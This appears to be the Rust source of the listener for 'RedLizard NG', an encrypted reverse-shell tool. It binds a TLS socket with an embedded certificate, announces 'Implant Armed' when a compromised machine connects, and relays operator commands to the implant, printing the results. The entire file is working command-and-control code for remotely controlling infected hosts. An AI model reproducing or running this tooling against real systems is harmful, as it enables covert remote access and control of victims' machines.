extern crate colored;
use colored::Colorize;
use std::io;
use std::env;
use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::process::exit;
use std::thread;
use native_tls::{Identity, TlsAcceptor, TlsStream};
use std::sync::Arc;

fn handle_client(mut stream: TlsStream<TcpStream>) {
    println!("[+] Implant Armed."); 
    loop {
        print!("Implant:~$ ");
        io::stdout().flush().expect("failed to get it");
        let mut input = String::new();
        let _ = io::stdin().read_line(&mut input);
        
        stream.write(&mut input.as_bytes()).unwrap();
        let mut data = [0 as u8; 10024];
        let _ = stream.read(&mut data);
        let string = String::from_utf8_lossy(&data);
        println!("{}", string); 
    }
}


fn main() {

    let args: Vec<String> = env::args().collect();

    if args.len()<3{
        println!("Pass the certificate password and the port as arguments");
        exit(1);
    }

    // read the password as first passed arg
    let passwd = &args[1];
    //*Certificate configuration: the file must be present inside src folder
    let cert_b = include_bytes!("zinz.pfx");
	//***********************************************************************
    //parse the certificate as byte array
    let identity = Identity::from_pkcs12(cert_b, passwd).unwrap();
    // read the port as second passed arg   
    let port = &args[2];
    let mut complete = "0.0.0.0:".to_string();

    complete.push_str(&port);
    let listener = TcpListener::bind(complete).expect("Cannot initiate the local TCP connection");
    let acceptor = TlsAcceptor::new(identity).unwrap();
    let acceptor = Arc::new(acceptor);


    println!("{}", r" \ \ \ \ \ \ \ \ \| |\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \| |\ \ \ \ \ \ \ \ \ 
/ / / / / / / / / | | / / / / / / __  / / / / / / / / | | / / / / / / / / /
 \ \ \ \ \ \ \ \ \| |\ \ \ \ \   /..\  ` ` \ \ \ \ \ \| |\ \ \ \ \ \ \ \ \ 
------------------' `---------- (    ) \|/ -----------' `------------------
 ,------------------------- _\___>  <__//` ------------------------------. 
 |/ / / / / / / / / / / / / >,---.   ,-'  / / / / / / / / / / / / / / / /| 
 | \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ |  . \  \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ | 
 |/ / / / / / / / / / / / / / /  `. `. \   ., / / / / / / / / / / / / / /| 
 | \ \ \ \ \ \ \ \ \ \ \ \ \ \ \  |  `. | \||_ \ \ \ \ \ \ \ \ \ \ \ \ \ | 
 |/ / / / / / / / / / / / / / / / `.  : |__||   / / / / / / / / / / / / /| 
 | \ \ \ \ \ \ \ \ \ \ \ \ \ \ \  __> `.,---'  \ \ \ \ \ \ \ \ \ \ \ \ \ | 
 |/ / / / / / / / / / / / / / /  |.--'\`.\  / / / / / / / / / / / / / / /| 
 `------------------------------ _\\   \`.| -----------------------------' 
------------------. ,------------ /|\ - |:| ----------. ,------------------
 \ \ \ \ \ \ \ \ \| |\ \ \ \ \ \ ' `    |:|  \ \ \ \ \| |\ \ \ \ \ \ \ \ \ 
/ / / / / / / / / | | / / / / / / / / / |:| / / / / / | | / / / / / / / / /
 \ \ \ \ \ \ \ \ \| |\ \ \ \ \ \ \ \ \  |:/  \ \ \ \ \| |\ \ \ \ \ \ \ \ \ 
/ / / / / / / / / | | / /  --.________,-_/  / / / / / | | / / / / / / / / /
 \ \ \ \ \ \ \ \ \| |\ \ \ \ \ ```-----' \ \ \ \ \ \ \| |\ \ \ \ \ \ \ \ \ ".red());
    println!("\n[+] Welcome to RedLizard NG - trickster0 && zinzloun \n");
    // accept connections and process them, spawning a new thread for each one
    println!("[+] Server listening on port {}",&port);
    for stream2 in listener.incoming() {
        match stream2 {
            Ok(stream2) => {
                println!("New connection: {}", stream2.peer_addr().unwrap());
                let acceptor = acceptor.clone();
                thread::spawn(move || {
                    // connection succeeded
                    let stream2 = acceptor.accept(stream2).unwrap();
                    handle_client(stream2)
                });
            }
            Err(e) => {
                println!("Error: {}", e);
                /* connection failed */
            }
        }
    }
}
